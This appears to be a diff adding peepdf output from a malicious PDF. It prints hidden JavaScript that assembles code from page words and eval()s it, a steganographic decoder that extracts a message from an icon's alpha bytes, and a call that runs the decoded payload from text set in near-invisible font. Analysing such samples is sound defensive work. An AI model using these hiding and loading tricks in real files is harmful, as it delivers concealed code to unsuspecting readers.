@@ -1,0 +1,52 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+box = "";
+for (i = 2; i < 5; i++) {
+    cnt = this.getPageNumWords(i);
+    for (j = 0; j < cnt; j++)
+    box += this.getPageNthWord(i, j, false);
+}
+eval(box);
+
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+BT / F1 0.01 Tf
+0 825 Td
+20 TL() Tj(function read\ (ic_name\) {)'
+(          var ic = this.getIcon\(ic_name\);) ' (var st = util.iconStreamFromIcon\ (ic\); // rgba1rgba2...) '
+(var modMessage = [];)'
+(          ) ' ( // T O D O: stop before scanning the whole stream) '
+(
+while\ (bytee = st.read\ (1\)\) {)'
+(            alpha = parseInt\("0x" + bytee\);) ' (modMessage.push\ (alpha - \ (255 - 11 + 1\)\);)'
+(            st.read\(3\);) ' (
+})'
+(          var codeUnitSize = 16;) ' (var t = 3;)'
+(          var message = "", charCode = 0, bitCount = 0, mask = Math.pow\(2, codeUnitSize\)-1;) ' ()'
+(          for\(var i = 0; i < modMessage.length; i+=1\) {) ' (charCode += modMessage[i] << bitCount;)'
+(            bitCount += t;) ' (
+if\ (bitCount >= codeUnitSize\) {)'
+(              message += String.fromCharCode\(charCode & mask\);) ' (bitCount %= codeUnitSize;)'
+(              charCode = modMessage[i] >> \(t-bitCount\);) ' (
+})'
+(          }) ' (
+if\ (charCode !== 0\))'
+(            message += String.fromCharCode\(charCode & mask\);) ' ()'
+(          var final_message = "";) ' (var LAST_ASCII_CHAR = 127;)'
+(          ) ' (
+for\ (var i = 0; i < message.length; i++\) {)'
+(            if \(message.charCodeAt\(i\) <= LAST_ASCII_CHAR\)) ' (final_message += message.charAt\ (i\);)'
+(            else) ' (
+break;)'
+(          }) ' ()'
+(          return final_message;) ' (
+})'
+ET
+
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+BT / F1 0.01 Tf
+0 825 Td
+20 TL(eval\ (read\ ("marshmallow"\)\);) Tj
+ET
+
